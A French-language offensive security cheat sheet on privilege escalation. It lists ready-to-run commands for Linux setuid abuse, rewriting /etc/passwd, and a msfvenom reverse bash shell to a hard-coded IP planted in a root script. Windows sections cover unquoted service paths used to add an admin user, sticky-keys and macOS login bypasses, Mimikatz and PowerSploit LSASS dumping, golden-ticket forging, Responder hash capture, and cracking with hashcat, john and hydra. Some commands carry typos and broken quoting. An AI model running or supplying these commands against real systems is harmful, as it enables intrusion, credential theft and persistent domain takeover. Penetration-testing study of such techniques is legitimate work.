# Privilege escalation

Le but est d'augmenter ses droits sur la machines. Par ordre décroissant d'important nous avons les rôles suivants zur un système:
* Kernel / System
* root / Administrateur
* user

Pour une webapp, de même nous avons:
* web admin
* web user
* www-data

Sur un domaine AD, on va chercher admin local, system, puis domain admin afin de générer un golden ticket si on est sur Kerberos. System est le vrai compte admin sur Windows. Admin n'a les permissions sur les fichiers sécurité type SAM seulement si System l'y autorise.

Différents façon de réussir l'escalade de privilèges sur un système:
* Exploit kernel
* Détournement de commandes setuid
* Exploiter les scripts de démarrage des services
* Voler un mdp
* Accès physique et machine non chiffrée
* Elevation vers domain admin
* Exploiter les fichiers de mots de pass (SAM, /etc/passwd, /etc/shadow)
* Manipulation de fichiers (chown, chmod 777...)
* Mimikatz et Powersploit
* bruteforcer mdp

## Exploit kernel
Il faut pour ça récupérer la version du kernel, et chercher un exploit qui y correspond dans les base de données dédiées. 
Une fois identifié, l'exploit doit être compilé sur la machine cible. L'exemple suivant avec merterpreter en remote :

    meterpreter > sysinfo (exemple => kernel 3.13.0)
    kali $ searchsploit 3.13.0
    kali $ searchsploit -m 37292
    meterpreter > cd /tmp
    meterpreter > upload /home/kali/37292.c
    meterpreter > shell
    gcc -o ./exploit ./37292.c
    ./exploit

## Buffer overflow & shellcode
Il est possible d'exploiter la pile d'exécution à traver l'exécution d'un binaire ne validant pas les entrées utilisateurs.
Il suffit de passer dans le buffer un payload dont la taille va lui permettre d'écraser le pointeur d'instruction, et ainsi mettre dans ce pointeur l'adresse du shellcode a exécuter. Le shellcode en général renvoi un shell root.
Cette attaque assez complexe mérite une section à part !

## Détournement de commandes setuid
Pour obtenir les commandes avec les droits root pour l'utilisateur courant:

    $ sudo -l

Pour exécuter une commande à la place d'un autre utilisateur

    $ sudo -u <user> <commande> 

Pour trouver la liste des commandes qui ont les droits root:

    $ find / -perm -u=s -type f 2>/dev/null

### cp
On va copier /etc/passwd dans /tmp, libre de droit, l'éditer pour ajouter une ligne avec un utilisateur root, puis recopier dans /etc/passwd

    $ openssl passwd -1 -salt micka pass123
    $ cp /tmp/passwd /etc/passwd
    $ su micka

### find
On créé un fichier que find sera sur de trouver enchainant sur l'execution d'une commande … un shell

    $ cd tmp
    $ touch fichier
    $ find fichier -exec "/bin/bash" \;

### teehee
teehee est un éditeur de texte qui log dans un fichier la sortie standard. On ajoute donc un user root dans /etc/passwd qui écrira dans ce fichier puisque le binaire est en exec root pour cet utilisateur

    $ echo "micka::0:0:::/bin/bash" | sudo teehee -a /ect/passwd
    $ su micka

### nano

    $ nano /ect/passwd

### nmap
Exploitation de nmap avec les droits user. Création d'un script nmap qui lance un shell puis lancement

    $ echo "os.execute('/bin/sh')">/tmp/root.nse
    $ sudo nmap --script=/tmp/root.nse

### script shell
Si un script sh est éxéutable avec les droits root, on ajouter une instruction de lancement d'un bash ou un code récupéré par un msfvenom en RAW créant un reverse shell

    $ msfvenom -p cmd/unix/reverse_bash lhost=@ip_att lport=numport R 
on a la création d'un script:

    0<&143-;exec 143<>/dev/tcp/193.250.161.80/4444;sh <&143 >&143 2>&143
on va recopier ce script dans backup.sh (script setuid) 

    echo ""0<&143-;exec 143<>/dev/tcp/193.250.161.80/4444;sh <&143 >&143 2>&143"" > ./backup.sh" 
   
## Exploiter les fichiers de mots de pass (SAM, /etc/passwd, /etc/shadow)

## Manipulation de fichiers (chown, chmod 777...)
ln -s vers un fichier sensible sur un fichier qui va changer de user (root vers user)

## Exploiter les scripts de démarrage des services
### Les services Windows
Une faille assez simple mais peu discrète est d'exploiter les scripts de démarrages des services vulnérables. Le problème réside dans l'absence des `"` pour délimiter le chemin. En effet en leur absence, Windows splitte la chaîne par les espaces et rajoute `.exe` au bout de la chaîne s'il est absent et essaye de lancer. Si ça ne fonctionne pas il passe à la chaîne suivante. Ainsi pour le binaire:

    C:\Program Files\folder\my program.exe
Windows essayera de lancer:

    C:\Program Files\folder\my.exe
Avant

    C:\Program Files\folder\my program.exe
Il suffit donc de créer notre binaire `my.exe` et dans le mettre dans folder pour installer de la persistance. Mais ce n'est pas très discret. Il serait plus discret de créer un meterpreter qui va injecter un processus dans une DLL d'internet explorer et qui se supprime et on est invisible.
Il faut ensuite que notre exe prennent en paramètre:

    net user hacker password123 /add
    net localgroup "Administrators" hacker /add
Ainsi on a ajouté un utilisateur dans le groupe administrateur, il n'y a plus qu'à se connecter avec. Pour pas laisser de traces on ajoute un `del my.exe` mais on perd la persistence.

Pour se faire il faut tout de même déja avoir accès à Windows.

Pour trouver les chemins de services vulnérables:

    wmic service get name,displayname,pathname,startmode | findstr /i "Auto"|findstr /i /v "C:\\Windows\\" |findstr /i /v """
Et rechercher `BINARY_PATH_NAME`

La console de service est accessible en via win+r et `services.msc`. La plupart des services sont démarrés en tant que SYSTEM.

### Les démons Unix
Les démon Unix étaient démarrés par `init.d`. `systemd` a pris le relais de `init.d` qui vieillit mais on retrouve toujours derrière son principe avec des scripts dans son répertoire qui en général se contente de lancer les binaires.

Prenons par exmple la vulnérabilité [CVE-2016-8641](https://www.exploit-db.com/exploits/40774) concernant le script de démarrage Nagios et qui permet une élévation de privilèges.

Le script (donc root) fait :

    touch $NagiosRunFile
    chown $NagiosUser:$NagiosGroup $NagiosRunFile $NagiosVarDir/nagios.log $NagiosRetentionFile
`touch` créé un fichier qui n'existe pas, mais si le fichier existe il conserve le contenu et modifie seulement les métadata. Le script va donc créé un fichier et qu'il va nous donner.

Le fichier en question est un fichier de lock qui sert à empêcher que plusieurs d'instance d'un même service soit lancées. Ce fichier disparait donc sur l'arrêt du processus. 
Si on arrive à demander à root d'arrêter le script, puis de le redémarrer, on va pouvoir entre temps faire un lien symbolique entre un fichier qu'on ne possède pas et un autre qui n'existe pas (linux le permet).

    ln -s /etc/shadow /usr/local/nagios/var/nagios.lock

Donc le fichier lock pointe vers `/etc/shadow` qui contient toutes les données de mot de passe. 
Quand root relance nagios, `touch` ne le recréé pas pas puisque la cible du lien existe et le chown nous donne les droits sur cette cible, donc le fichier de mot de passe. Donc le fichier de mot de passe nous appartient on va pouvoir le modifier.

Pour rajouter très vite un condensat d'un mot de passe que l'on connait, il suffit de reprendre le condensat de nagios.

Un deuxième exemple, ce script d'initialisation de slapd:

    piddir=`dirname "$SLAPD_PID_FILE"`
    if [ ! -d "$piddir" ]; then
        mkdir -p "$piddir"
        [ -z "$SLAPD_USER" ] || chown -R "$SLAPD_USER" "$piddir"
        [ -z "$SLAPD_GROUP" ] || chgrp -R "$SLAPD_GROUP" "$piddir"
    fi
En ligne 3 le script (exécuté en root) créé le répertoire `$piddir` dans lequel l'utilisateur a accès, si il crée un hardling vers `/root/.bashrc` dedans, à la prochaine exécution du script, le `chown -R` va donner les droits à la cible du lien donc le `/root/.bashrc` va appartenir à l'utilisateur.

## Voler un mdp
Parfois il suffit de fouiller dans les documents des utilisateurs et les mails présents dans `/var/mail` pour trouver des échanges avec des mot de passe en clair pour des utilisateurs avec privilèges ou des fichiers de sauvegarde.

## Accès physique et machine non chiffrée
Avec un accès physique, une clé bootable Windows (officiel ou Hirren's CD) et une machine non chiffrée:
* booter
* lancer la console de récupération
* sethc.exe : le binaire lancé après 5 shift pour les touches remanantes exécuté avec le comte system. il suffit de copier cmd.exe en sethc.exe
* reboot, 5 shift et on a une console en system devant la fenêtre de login : c-a-d sans s'être connecté, sans connaitre de mot de passe !!!

Pourquoi ça marche ? Windows est multi-session, d'abords la session System démarre, donc même quand personne n'est loggé (devant la fenetre de log), la session Systeme est active.

En clonant dans une machine virtuelle on peut avoir le même résultat.

## PSexec
admin n'a pas les droits, c'est Sytem qui les a. Donc dans HKEY_LOCAL_MACHINE\SAM\SAM admin ne voit rien.

Le programme gratuit et portable `PSexec` permet de passer System:

    c:\psexec.exe -i -s -d cmd 
Si on relance `regedit`, on voit tout cette fois dans la base SAM.

## Elevation vers domain admin
Lancer `dsa.msc` sur un controleur de domaine. Le compte System sur une machine contrôleur de domaine a des droits équivalents a domain admin. Il est donc possible de réinitialiser le mot de passe du contrôleur et passer enterprise admin.

Une faiblesse possivle est dans la clé `HKEY_LOCAL_MACHINE\SECURITY\policy` : les LSA secrets. C'est là où sont stockés tout les mdp des comptes de services.
Le danger c'est si un admin par négligeance configure un service avec un compte qui a les droits sur tout les services, par exemple domain admin, alors le pass sera facilement crackable (cain et abel?) dans les LSA secrets.

Admin AD travaille en enterprise admin (admin local sur tt les controleur de domaine) et pas en domain admin (admin de tte les machines de l'entreprise)
Domain admin plus fort qu'entreprise admin

## Exploiter une mauvaise configuration de droits des scripts
Un script sur lequel on a le droit d'écriture et les droits d'exécution root est de fait vulnérable, on peut faire ce qu'on veut.

## Mimikatz et Powersploit
### Mimikatz
En 3 commandes il est possible d'obtenir les mdp et les hash de ts les users sur la machine.

    mimikatz.exe
    privilege::debug // permet d'avoir les droits sous windows pour analyser la mémoire
    sekurlsa::logonpasswords

Pour faire une attaque, pas besoin du mdp en clair, le hash suffit, c'est l'attaque pass the hash. En effet, une fois la session ouverte avec ntlm par exemple, le hash est en mémoire. a chaque accès fichier le challenge réponse va être fait avec le hash. Cette attaque est tout de même de moins en moins efficace.

#### Pass the Hash:
Récupérer les tickets sous mimikats:

    sekurlsa::Tickets /export

Puis sur une autre machine, on importe le fichier de tickets précédents, c'est du kerberos pass the ticket : 

    kerberos::ptt d:\nomfichier

En récupérant les ticket kerberos on peut donc passer DC alors qu'on était simplement admin local (en s'injecteant les tickets).

Quand Kerberos est utilisé, il faut récupérer les tickets, quand c'est NTLM, il faut récupérer les hash.

#### Golden Ticket
golden ticket: généré par le domain admin, le compte `krbtgt` désactivé par défaut, c'est compte qui fait autorité sur kerberos, si on récuprère son NT hash on peut forger autant de ticket kerberos que l'on veut.
Donc on se génère un golden ticket valable 100 ans ou garde le NT hash du krbtgt, pour avoir un accès pérènne. Le moment voulu, ils viennent avec une machine exterieure avec le bon workgroup avec un ticket générée, ils se pluggent sur le réseau et ils auront les accès domain admin.

Commande pour le golden ticket:

    mimikatz.exe "privilege::debug" "kerberos::golden /admin:darkalan /domain:msexp76.intra /id:4000 /sid:S-1-5-21-595127354-1458299726-2062179204 /krbtgt:49918692dbb7808c45b8fefe499bc7f6 /staroffset:0 /endin:600 /renewmax:10080 /ptt"
Avec:
* nom du domaine : msexp76.intra
* kbrtgt : 49918692dbb7808c45b8fefe499bc7f6
* SID du domaine : S-1-5-21-595127354-1458299726-2062179204

Depuis Windows 10 LSASS ne stock plus les mdp pour éviter d'être lu par Mimikatz. Il faut pour ça régler dans la base de registre à 0 le paramètre `UseLogonCredential` et forcer l'utilsateur à se reconnecter (`rundll32.Exe user32.dll,LockWorkStation`).

### Powersploit
[Powersploit](https://github.com/PowerShellMafia/PowerSploit): powershell permettant d'invoquer mimikatz donc de passer l'AV
* télécharger
* copier les sources dans le dossier : C:\windows\System32\WindowsPowerShell\v1.0\Modules
* Débloquer les fichiers: Get-ChildItem -Path  C:\windows\System32\WindowsPowerShell\v1.0\Modules\Powersploit -Recurse | Unblock-File

Processus LSASS avec Powersploit
Commandes basée sur la commande Out-Minidump de PowerSploit

Exporter le contenu de la mémoire du processus LSASS dans un fichier:

    Get-Process Lsass | Out-Minidump -DumpFilePath C:\_adm\Dump

Lancer Mimikatz

    sekurlsa::minidump C:\_adm\Dump\lsass_512.dmp
    sekurlsa::logonpasswords

Variante avec la commande:

    Invoke-Mimikatz -command "privilege::debug sekurlsa::logonpasswords"

Voler un jeton d'acces:

    Invoke-TokenManipulation -Enumerate
    Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId 2696

Plus d'info ici : https://wwww/scribd.com/doc/241252231/Mimikatz-2-4-extraction-de-mots-de-passe-via-un-dump-memoire-tuto-de-a-a-Z 


## Bruteforcer mdp
### Linux/Unix
D'abords identifier le condensat dans `/etc/shadow`. A la ligne de l'utilisateur, le deuxième champs est le condensat.
Le condensat peut contenir des champs débutants par `$` par exemple:

    $6$Cqi0mMs$Rum5t......
avec:
* `$6` 6 est le type de hash
* `$Cqi0mMs` Cqi0mMs est le salt, c'est à dire un élément ajoutant de l'alea dans le mot de passe. Il faut le connaitre pour reconstituer le hash, sans lui le mdp est perdu
* `$Rum......` le hash du mot de passe en lui même 

On peut retrouver la technique de hash dans le fichier `login.defs` au champs ENCRYPT_METHOD, et ne nombre de round un peu plus bas (permet de ralentir le bruteforce):

    $ grep -A 18 ENCRYPT_METHOD /etc/login.defs

Une fois que l'on connait le type, on peut utiliser hashcat (ou `johntheripper` ou `medusa`). Avant cela on met le hash dans un fichier `hash.txt` depuis le type (`$6`) jusqu'au bout du hash et seulement ça, puis:

    $ ./hashcat-cli32.bin -m 1800 -a 0 -o result.txt --remove hash.txt wordlist.txt
    $ cat result
Avec:

* `-m 1800` correspond au type 6 Unix
* `-a 0` utilisation d'un dictionnaire
* `o result` fichier de sortie
* `--remove` supprime chaque hash jusqu'à le trouver
* puis le fichier d'entrée et le dictionnaire

### Windows

#### SAM et NTLM
Les mots de passes sont dans le fichier SAM hashé en NTLM. Le fichier se trouve dans `%SystemRoot%\system32\config`.
Durant le boot se hash de ce fichier sont décrypté avec SYSKEY et chargé dans le registre pour servir lors de l'authentification utilisateur.
Le fichier n'est pas sensé être accessible sous Windows, il est possible par contre de le récupérer en bootant sur Linux.

Pour monter la partition si elle n'est pas montée:

    $ fdisk -l
En général la bonne partition est la deuxième NTFS.

    $ mkdir /mnt/C
    $ mount /dev/sda2 /mnt/C
Pour récupérer le SAM:

    $ cp /mnt/C/Windows/System32/config/SAM ~/
Pour extraire les hash avec l'utilisatire `samdump2` dansle fichier hash.txt:

    $ sudo apt install samdump2
    $ cp /mnt/C/Windows/System32/config/SYSTEM ~/
    $ samdump2 SYSTEM SAM > hash.txt

Cracker le mot de passe à partir d'un dictionnaire et de John The Ripper:

    $  john –format=LM –wordlist=/root/usr/share/john/password_john.txt hash.txt

#### NTLMv2 et LLMNR poisoning
Pour capturer les hash, il suffit d'écouter sur le réseau avec respondeur. Lorsque la machine Windows essaye de se connecter sur un dossier qui n'existe pas par exemple lorsque dans la barre d'adresse du navigateur on cherche `\\nowhere\nofile`, Windows va envoyer des requêtes LLMNR capturer par Responder. 
Pour lancer Responder (sur l'interface eth0):

    $ responder -I eth0

Un autre moyen de capturer est avec un accès physique à la machine. Même quand la session Windows est verrouillée, avec une clé type RubberDucky, BashBunny ou USBArmory qui embarque un Linux et un Responder, il suffit de brancher la clé USB et attendre quelques secondes. Lorsque l'on branche un système sur le port USB, Windows fait confiance et envoi des requêtes LLMNR avec les hash dedans, puisque l'on est pas sensé avoir un système d'écoute sur le port USB.

Pour cracker le mot de passe avec `hashcat`:

    $ hashcat -m 5600 administrator-ntlmv2 /usr/share/wordlists/rockyou.txt  --force


### OSX
#### bypass OSX root
Sur un mac éteint, démarrer avec command+s, jusqu'au son pour un démarrage en single user mode.

    /sbin/mount -uw /
    rn/var/db/.applesetupdone
    reboot
Après reboot, un prompt nous demande si c'est un factory reset. Suivre les instructions surtout en sélectionnant "Do not transfer data".
Créer un compte admin. Le système va automatiquement nous logger en admin. 

#### bypass OSX user
Sur un mac éteint, démarrer avec command+r, jusqu'à voir le logo apple (relâcher command+r).
Ouvrir un terminal dans les utilitaires dans la barre du haut.
Sélectionner le disque et le user. Taper un nouveau mot de passe, save et redémarrer pour se logger avec ce nouveau pass.

### ssh
Il est possible de bruteforcer ssh avec `hydra`

    $ hydra -l user -p pass 192.168.1.10 -t 4 ssh
Avec:
* `-l` pour un utilisateur `L` pout utiliser un dictionnaire
* `-p` pour un mot de passe `P` pout utiliser un dictionnaire
* `-t` pour le nombre de thread, 4 est le nombre recommandé pour ssh

### Générer un disctionnaire avec crunch
crunch est un utilitaire qui permet de génerer un dictionnaire:

    $ crunch 3 5 0123456789abcdefghijklmnopqrstuvwxyz -o wordlist.txt
Génère toute les combinaisons de 3 à 5 caractères composées de [0-9] et [a-z] et les stocke dans le fichier wordlist.txt

    $ crunch 3 5 0123456789abcdefghijklmnopqrstuvwxyz >> wordlist.txt
Génère toute les combinaisons de 3 à 5 caractères composées de [0-9] et [a-z] et les concatène dans le fichier wordlist.txt

## Les options hashcat
Les principaux:
Number| Name| Category
-:|:-|:-
900 | MD4                                            | Raw Hash
0 | MD5                                              | Raw Hash
100 | SHA1                                             | Raw Hash
1400 | SHA2-256                                         | Raw Hash
1700 | SHA2-512                                         | Raw Hash
17400 | SHA3-256                                         | Raw Hash
17600 | SHA3-512                                         | Raw Hash
5500 | NetNTLMv1                                        | Network Protocols
5500 | NetNTLMv1+ESS                                    | Network Protocols
5600 | NetNTLMv2                                        | Network Protocols
3000 | LM                                               | Operating Systems
1000 | NTLM                                             | Operating Systems
500 | md5crypt, MD5 (Unix), Cisco-IOS **\$1\$** (MD5)        | Operating Systems
3200 | bcrypt **\$2\*\$**, Blowfish (Unix)                     | Operating Systems
7400 | sha256crypt **\$5\$**, SHA256 (Unix)                   | Operating Systems
1800 | sha512crypt **\$6\$**, SHA512 (Unix)                   | Operating Systems


La liste exhaustive:
Number| Name| Category
-:|:-|:-
900 | MD4                                            | Raw Hash
0 | MD5                                              | Raw Hash
5100 | Half MD5                                         | Raw Hash
100 | SHA1                                             | Raw Hash
1300 | SHA2-224                                         | Raw Hash
1400 | SHA2-256                                         | Raw Hash
10800 | SHA2-384                                         | Raw Hash
1700 | SHA2-512                                         | Raw Hash
17300 | SHA3-224                                         | Raw Hash
17400 | SHA3-256                                         | Raw Hash
17500 | SHA3-384                                         | Raw Hash
17600 | SHA3-512                                         | Raw Hash
17700 | Keccak-224                                       | Raw Hash
17800 | Keccak-256                                       | Raw Hash
17900 | Keccak-384                                       | Raw Hash
18000 | Keccak-512                                       | Raw Hash
600 | BLAKE2b-512                                      | Raw Hash
10100 | SipHash                                          | Raw Hash
6000 | RIPEMD-160                                       | Raw Hash
6100 | Whirlpool                                        | Raw Hash
6900 | GOST R 34.11-94                                  | Raw Hash
11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian | Raw Hash
11800 | GOST R 34.11-2012 (Streebog) 512-bit, big-endian | Raw Hash
10 | md5(\$pass.\$salt)                                 | Raw Hash, Salted and/or Iterated
20 | md5(\$salt.\$pass)                                 | Raw Hash, Salted and/or Iterated
30 | md5(utf16le(\$pass).\$salt)                        | Raw Hash, Salted and/or Iterated
40 | md5(\$salt.utf16le(\$pass))                        | Raw Hash, Salted and/or Iterated
3800 | md5(\$salt.\$pass.\$salt)                           | Raw Hash, Salted and/or Iterated
3710 | md5(\$salt.md5(\$pass))                            | Raw Hash, Salted and/or Iterated
4010 | md5(\$salt.md5(\$salt.\$pass))                      | Raw Hash, Salted and/or Iterated
4110 | md5(\$salt.md5(\$pass.\$salt))                      | Raw Hash, Salted and/or Iterated
2600 | md5(md5(\$pass))                                  | Raw Hash, Salted and/or Iterated
3910 | md5(md5(\$pass).md5(\$salt))                       | Raw Hash, Salted and/or Iterated
4300 | md5(strtoupper(md5(\$pass)))                      | Raw Hash, Salted and/or Iterated
4400 | md5(sha1(\$pass))                                 | Raw Hash, Salted and/or Iterated
110 | sha1(\$pass.\$salt)                                | Raw Hash, Salted and/or Iterated
120 | sha1(\$salt.\$pass)                                | Raw Hash, Salted and/or Iterated
130 | sha1(utf16le(\$pass).\$salt)                       | Raw Hash, Salted and/or Iterated
140 | sha1(\$salt.utf16le(\$pass))                       | Raw Hash, Salted and/or Iterated
4500 | sha1(sha1(\$pass))                                | Raw Hash, Salted and/or Iterated
4520 | sha1(\$salt.sha1(\$pass))                          | Raw Hash, Salted and/or Iterated
4700 | sha1(md5(\$pass))                                 | Raw Hash, Salted and/or Iterated
4900 | sha1(\$salt.\$pass.\$salt)                          | Raw Hash, Salted and/or Iterated
14400 | sha1(CX)                                         | Raw Hash, Salted and/or Iterated
1410 | sha256(\$pass.\$salt)                              | Raw Hash, Salted and/or Iterated
1420 | sha256(\$salt.\$pass)                              | Raw Hash, Salted and/or Iterated
1430 | sha256(utf16le(\$pass).\$salt)                     | Raw Hash, Salted and/or Iterated
1440 | sha256(\$salt.utf16le(\$pass))                     | Raw Hash, Salted and/or Iterated
1710 | sha512(\$pass.\$salt)                              | Raw Hash, Salted and/or Iterated
1720 | sha512(\$salt.\$pass)                              | Raw Hash, Salted and/or Iterated
1730 | sha512(utf16le(\$pass).\$salt)                     | Raw Hash, Salted and/or Iterated
1740 | sha512(\$salt.utf16le(\$pass))                     | Raw Hash, Salted and/or Iterated
50 | HMAC-MD5 (key = \$pass)                           | Raw Hash, Authenticated
60 | HMAC-MD5 (key = \$salt)                           | Raw Hash, Authenticated
150 | HMAC-SHA1 (key = \$pass)                          | Raw Hash, Authenticated
160 | HMAC-SHA1 (key = \$salt)                          | Raw Hash, Authenticated
1450 | HMAC-SHA256 (key = \$pass)                        | Raw Hash, Authenticated
1460 | HMAC-SHA256 (key = \$salt)                        | Raw Hash, Authenticated
1750 | HMAC-SHA512 (key = \$pass)                        | Raw Hash, Authenticated
1760 | HMAC-SHA512 (key = \$salt)                        | Raw Hash, Authenticated
11750 | HMAC-Streebog-256 (key = \$pass), big-endian      | Raw Hash, Authenticated
11760 | HMAC-Streebog-256 (key = \$salt), big-endian      | Raw Hash, Authenticated
11850 | HMAC-Streebog-512 (key = \$pass), big-endian      | Raw Hash, Authenticated
11860 | HMAC-Streebog-512 (key = \$salt), big-endian      | Raw Hash, Authenticated
14000 | DES (PT = \$salt, key = \$pass)                    | Raw Cipher, Known-Plaintext attack
14100 | 3DES (PT = \$salt, key = \$pass)                   | Raw Cipher, Known-Plaintext attack
14900 | Skip32 (PT = \$salt, key = \$pass)                 | Raw Cipher, Known-Plaintext attack
15400 | ChaCha20                                         | Raw Cipher, Known-Plaintext attack
400 | phpass                                           | Generic KDF
8900 | scrypt                                           | Generic KDF
11900 | PBKDF2-HMAC-MD5                                  | Generic KDF
12000 | PBKDF2-HMAC-SHA1                                 | Generic KDF
10900 | PBKDF2-HMAC-SHA256                               | Generic KDF
12100 | PBKDF2-HMAC-SHA512                               | Generic KDF
23 | Skype                                            | Network Protocols
2500 | WPA-EAPOL-PBKDF2                                 | Network Protocols
2501 | WPA-EAPOL-PMK                                    | Network Protocols
16800 | WPA-PMKID-PBKDF2                                 | Network Protocols
16801 | WPA-PMKID-PMK                                    | Network Protocols
4800 | iSCSI CHAP authentication, MD5(CHAP)             | Network Protocols
5300 | IKE-PSK MD5                                      | Network Protocols
5400 | IKE-PSK SHA1                                     | Network Protocols
5500 | NetNTLMv1                                        | Network Protocols
5500 | NetNTLMv1+ESS                                    | Network Protocols
5600 | NetNTLMv2                                        | Network Protocols
7300 | IPMI2 RAKP HMAC-SHA1                             | Network Protocols
7500 | Kerberos 5 AS-REQ Pre-Auth etype 23              | Network Protocols
8300 | DNSSEC (NSEC3)                                   | Network Protocols
10200 | CRAM-MD5                                         | Network Protocols
11100 | PostgreSQL CRAM (MD5)                            | Network Protocols
11200 | MySQL CRAM (SHA1)                                | Network Protocols
11400 | SIP digest authentication (MD5)                  | Network Protocols
13100 | Kerberos 5 TGS-REP etype 23                      | Network Protocols
16100 | TACACS+                                          | Network Protocols
16500 | JWT (JSON Web Token)                             | Network Protocols
18200 | Kerberos 5 AS-REP etype 23                       | Network Protocols
121 | SMF (Simple Machines Forum) > v1.1               | Forums, CMS, E-Commerce, Frameworks
400 | phpBB3 (MD5)                                     | Forums, CMS, E-Commerce, Frameworks
2611 | vBulletin < v3.8.5                               | Forums, CMS, E-Commerce, Frameworks
2711 | vBulletin >= v3.8.5                              | Forums, CMS, E-Commerce, Frameworks
2811 | MyBB 1.2+                                        | Forums, CMS, E-Commerce, Frameworks
2811 | IPB2+ (Invision Power Board)                     | Forums, CMS, E-Commerce, Frameworks
8400 | WBB3 (Woltlab Burning Board)                     | Forums, CMS, E-Commerce, Frameworks
11 | Joomla < 2.5.18                                  | Forums, CMS, E-Commerce, Frameworks
400 | Joomla >= 2.5.18 (MD5)                           | Forums, CMS, E-Commerce, Frameworks
400 | WordPress (MD5)                                  | Forums, CMS, E-Commerce, Frameworks
2612 | PHPS                                             | Forums, CMS, E-Commerce, Frameworks
7900 | Drupal7                                          | Forums, CMS, E-Commerce, Frameworks
21 | osCommerce                                       | Forums, CMS, E-Commerce, Frameworks
21 | xt:Commerce                                      | Forums, CMS, E-Commerce, Frameworks
11000 | PrestaShop                                       | Forums, CMS, E-Commerce, Frameworks
124 | Django (SHA-1)                                   | Forums, CMS, E-Commerce, Frameworks
10000 | Django (PBKDF2-SHA256)                           | Forums, CMS, E-Commerce, Frameworks
16000 | Tripcode                                         | Forums, CMS, E-Commerce, Frameworks
3711 | MediaWiki B type                                 | Forums, CMS, E-Commerce, Frameworks
13900 | OpenCart                                         | Forums, CMS, E-Commerce, Frameworks
4521 | Redmine                                          | Forums, CMS, E-Commerce, Frameworks
4522 | PunBB                                            | Forums, CMS, E-Commerce, Frameworks
12001 | Atlassian (PBKDF2-HMAC-SHA1)                     | Forums, CMS, E-Commerce, Frameworks
12 | PostgreSQL                                       | Database Server
131 | MSSQL (2000)                                     | Database Server
132 | MSSQL (2005)                                     | Database Server
1731 | MSSQL (2012, 2014)                               | Database Server
200 | MySQL323                                         | Database Server
300 | MySQL4.1/MySQL5                                  | Database Server
3100 | Oracle H: Type (Oracle 7+)                       | Database Server
112 | Oracle S: Type (Oracle 11+)                      | Database Server
12300 | Oracle T: Type (Oracle 12+)                      | Database Server
8000 | Sybase ASE                                       | Database Server
141 | Episerver 6.x < .NET 4                           | HTTP, SMTP, LDAP Server
1441 | Episerver 6.x >= .NET 4                          | HTTP, SMTP, LDAP Server
1600 | Apache \$apr1\$ MD5, md5apr1, MD5 (APR)            | HTTP, SMTP, LDAP Server
12600 | ColdFusion 10+                                   | HTTP, SMTP, LDAP Server
1421 | hMailServer                                      | HTTP, SMTP, LDAP Server
101 | nsldap, SHA-1(Base64), Netscape LDAP SHA         | HTTP, SMTP, LDAP Server
111 | nsldaps, SSHA-1(Base64), Netscape LDAP SSHA      | HTTP, SMTP, LDAP Server
1411 | SSHA-256(Base64), LDAP {SSHA256}                 | HTTP, SMTP, LDAP Server
1711 | SSHA-512(Base64), LDAP {SSHA512}                 | HTTP, SMTP, LDAP Server
16400 | CRAM-MD5 Dovecot                                 | HTTP, SMTP, LDAP Server
15000 | FileZilla Server >= 0.9.55                       | FTP Server
11500 | CRC32                                            | Checksums
3000 | LM                                               | Operating Systems
1000 | NTLM                                             | Operating Systems
1100 | Domain Cached Credentials (DCC), MS Cache        | Operating Systems
2100 | Domain Cached Credentials 2 (DCC2), MS Cache 2   | Operating Systems
15300 | DPAPI masterkey file v1                          | Operating Systems
15900 | DPAPI masterkey file v2                          | Operating Systems
12800 | MS-AzureSync  PBKDF2-HMAC-SHA256                 | Operating Systems
1500 | descrypt, DES (Unix), Traditional DES            | Operating Systems
12400 | BSDi Crypt, Extended DES                         | Operating Systems
500 | md5crypt, MD5 (Unix), Cisco-IOS \$1\$ (MD5)        | Operating Systems
3200 | bcrypt \$2*\$, Blowfish (Unix)                     | Operating Systems
7400 | sha256crypt \$5\$, SHA256 (Unix)                   | Operating Systems
1800 | sha512crypt \$6\$, SHA512 (Unix)                   | Operating Systems
122 | macOS v10.4, MacOS v10.5, MacOS v10.6            | Operating Systems
1722 | macOS v10.7                                      | Operating Systems
7100 | macOS v10.8+ (PBKDF2-SHA512)                     | Operating Systems
6300 | AIX {smd5}                                       | Operating Systems
6700 | AIX {ssha1}                                      | Operating Systems
6400 | AIX {ssha256}                                    | Operating Systems
6500 | AIX {ssha512}                                    | Operating Systems
2400 | Cisco-PIX MD5                                    | Operating Systems
2410 | Cisco-ASA MD5                                    | Operating Systems
500 | Cisco-IOS \$1\$ (MD5)                              | Operating Systems
5700 | Cisco-IOS type 4 (SHA256)                        | Operating Systems
9200 | Cisco-IOS \$8\$ (PBKDF2-SHA256)                    | Operating Systems
9300 | Cisco-IOS \$9\$ (scrypt)                           | Operating Systems
22 | Juniper NetScreen/SSG (ScreenOS)                 | Operating Systems
501 | Juniper IVE                                      | Operating Systems
15100 | Juniper/NetBSD sha1crypt                         | Operating Systems
7000 | FortiGate (FortiOS)                              | Operating Systems
5800 | Samsung Android Password/PIN                     | Operating Systems
13800 | Windows Phone 8+ PIN/password                    | Operating Systems
8100 | Citrix NetScaler                                 | Operating Systems
8500 | RACF                                             | Operating Systems
7200 | GRUB 2                                           | Operating Systems
9900 | Radmin2                                          | Operating Systems
125 | ArubaOS                                          | Operating Systems
7700 | SAP CODVN B (BCODE)                              | Enterprise Application Software (EAS)
7701 | SAP CODVN B (BCODE) via RFC_READ_TABLE           | Enterprise Application Software (EAS)
7800 | SAP CODVN F/G (PASSCODE)                         | Enterprise Application Software (EAS)
7801 | SAP CODVN F/G (PASSCODE) via RFC_READ_TABLE      | Enterprise Application Software (EAS)
10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1              | Enterprise Application Software (EAS)
8600 | Lotus Notes/Domino 5                             | Enterprise Application Software (EAS)
8700 | Lotus Notes/Domino 6                             | Enterprise Application Software (EAS)
9100 | Lotus Notes/Domino 8                             | Enterprise Application Software (EAS)
133 | PeopleSoft                                       | Enterprise Application Software (EAS)
13500 | PeopleSoft PS_TOKEN                              | Enterprise Application Software (EAS)
11600 | 7-Zip                                            | Archives
12500 | RAR3-hp                                          | Archives
13000 | RAR5                                             | Archives
13200 | AxCrypt                                          | Archives
13300 | AxCrypt in-memory SHA1                           | Archives
13600 | WinZip                                           | Archives
14700 | iTunes backup < 10.0                             | Backup
14800 | iTunes backup >= 10.0                            | Backup
62XY | TrueCrypt                                        | Full-Disk Encryption (FDE)
X  | 1 = PBKDF2-HMAC-RIPEMD160                        | Full-Disk Encryption (FDE)
